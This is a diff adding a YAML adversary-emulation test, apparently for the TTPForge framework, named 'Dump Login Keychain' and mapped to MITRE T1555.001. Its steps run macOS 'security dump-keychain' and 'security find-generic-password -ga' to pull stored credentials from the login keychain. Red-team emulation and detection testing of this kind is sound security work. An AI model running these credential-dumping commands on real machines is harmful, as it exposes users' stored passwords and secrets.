@@ -1,0 +1,46 @@
+api_version: 2.0
+uuid: 12345678-1234-1234-1234-000000000001
+name: Dump Login Keychain
+description: Extract credentials from macOS login keychain using security command
+author: TTPForge
+created: 2025-01-30
+tactics:
+  - Credential Access
+techniques:
+  - T1555.001
+requirements:
+  platforms:
+    - os: darwin
+args:
+  - name: keychain_path
+    description: Path to keychain database
+    default: "~/Library/Keychains/login.keychain-db"
+steps:
+  - name: Check Keychain Access
+    type: command
+    command: "security default-keychain"
+  
+  - name: Dump Login Keychain
+    type: command
+    command: "security dump-keychain {{ keychain_path }}"
+    
+  - name: Extract Keychain Items
+    type: command
+    command: "security find-generic-password -ga '*' {{ keychain_path }} 2>/dev/null | head -20"
+
+checks:
+  - type: stdout_contains
+    value: "class"
+    description: Verify keychain dump output contains keychain class information
+
+tests:
+  - name: Query Keychain
+    description: Query keychain without modification
+    test_type: default
+    steps:
+      - "security default-keychain"
+
+cleanup:
+  - type: command
+    command: "true"
+    description: No cleanup required for read-only operation
